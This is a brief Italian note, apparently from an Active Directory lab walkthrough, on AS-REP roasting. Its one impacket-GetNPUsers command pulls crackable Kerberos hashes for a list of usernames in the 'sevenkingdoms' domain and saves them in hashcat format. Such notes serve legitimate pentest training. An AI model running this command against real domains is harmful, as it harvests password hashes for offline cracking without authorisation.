### **ASPREP-roasting**
Hai trovato la lista degli username, ora spolvera gli appunti
```bash
impacket-GetNPUsers 'sevenkingdoms/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
```